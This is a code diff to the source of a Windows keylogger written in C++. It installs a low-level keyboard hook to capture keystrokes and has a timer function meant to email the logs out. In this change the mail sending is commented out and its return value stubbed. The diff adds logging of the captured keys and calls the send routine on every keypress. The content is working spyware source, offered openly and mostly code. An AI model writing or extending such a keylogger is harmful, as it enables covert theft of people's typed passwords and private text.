@@ -14,13 +14,14 @@ std::string keylog = "";
 
 void TimerSendMail()
 {
+    Helper::WriteAppLog(keylog);
     std::cout << keylog << std::endl;
 
     // There could be no keyboard activity during this interval, so we need to check if there are any key logs or not
     if(keylog.empty())
         return;
 
-    std::string last_file = ""; // IO::WriteLog(keylog);
+    std::string last_file ; //= IO::WriteLog(keylog);
 
     if(last_file.empty())
     {
@@ -28,7 +29,7 @@ void TimerSendMail()
         return;
     }
 
-    int retValue ; // = Mail::SendMail("subject", "body", IO::GetOurPath(true) + last_file);
+    int retValue = 7; // = Mail::SendMail("subject", "body", IO::GetOurPath(true) + last_file);
 
     if( retValue != 7 )
         Helper::WriteAppLog("Mail was not sent!! Error Code :" + Helper::ToString(retValue));
@@ -38,7 +39,7 @@ void TimerSendMail()
     }
 }
 
-//Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
+// Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
 
 HHOOK eHook = NULL;
 
@@ -86,13 +87,15 @@ LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
         }
     }
 
-    // with this we are propogating the key press forward else they will be consumed by our keylogger
+    TimerSendMail();
+
+    // with this we are propagating the key press forward else they will be consumed by our keylogger
     return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
 
 bool InstallHook()
 {
-    // Helper::WriteAppLog("Hook started...timer started");
+    Helper::WriteAppLog("Hook started...timer started");
 
 //    MailTimer.Start(true);
     eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc, GetModuleHandle(NULL), 0);
